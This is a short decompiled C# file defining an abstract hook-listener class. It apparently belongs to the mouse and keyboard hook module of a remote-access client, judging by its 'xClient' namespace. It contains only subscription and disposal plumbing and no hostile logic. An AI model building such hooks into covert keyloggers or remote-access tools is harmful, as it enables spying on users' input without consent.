using System;
using xClient.Core.MouseKeyHook.WinApi;

namespace xClient.Core.MouseKeyHook.Implementation
{
	// Token: 0x0200005C RID: 92
	internal abstract class BaseListener : IDisposable
	{
		// Token: 0x06000272 RID: 626 RVA: 0x000032AC File Offset: 0x000014AC
		protected BaseListener(Subscribe subscribe)
		{
			this.Handle = subscribe(new Callback(this.Callback));
		}

		// Token: 0x17000056 RID: 86
		// (get) Token: 0x06000273 RID: 627 RVA: 0x000032CD File Offset: 0x000014CD
		// (set) Token: 0x06000274 RID: 628 RVA: 0x000032D5 File Offset: 0x000014D5
		protected HookResult Handle { get; set; }

		// Token: 0x06000275 RID: 629 RVA: 0x000032DE File Offset: 0x000014DE
		public void Dispose()
		{
			this.Handle.Dispose();
		}

		// Token: 0x06000276 RID: 630
		protected abstract bool Callback(CallbackData data);
	}
}
